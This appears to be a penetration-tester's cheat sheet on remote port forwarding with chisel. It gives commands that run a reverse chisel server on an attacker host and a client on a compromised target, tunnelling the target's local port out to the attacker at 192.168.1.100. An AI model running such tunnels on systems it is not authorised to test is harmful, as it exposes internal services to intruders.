# Remote Port Forwarding

> Forward a locally available port to a remote port.

## Forward a Remote Target's Local Port to a Port of the Local Attacker

Requires command execution access to the target.

Download the appropriate binaries of [`chisel`](https://github.com/jpillora/chisel/releases) for both the attacker and the target machine. Transfer a binary to the target machine.

Start the `chisel` server on the attacker's machine:

```bash
./chisel server --port $PORT_TO_SERVE_CHISEL_ON --reverse
```

Initiate the port forward from the target's machine using the `chisel` client:

```bash
./chisel client $HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER:$PORT_OF_CHISEL_SERVER R:$TARGET_LOCAL_PORT_TO_FORWARD:localhost:$ATTACKER_LOCAL_PORT_TO_CONNECT_TO
```

### Example

If you wanted to forward the target's `localhost:8001` to the attacker's port 8002, you would start by serving `chisel` on an arbitrary port on the attacker's machine. The attacker's IP address is 192.168.1.100.

```bash
./chisel server --port 8000 --reverse
```

On the target machine:

```bash
./chisel client 192.168.1.100:8000 R:8001:localhost:8002
```

To access the target's `localhost:8001`, connect to the attacker's `localhost:8002`.

## Theory

![[remote-port-forwarding-1.png]]

![[remote-port-forwarding-2.png]]
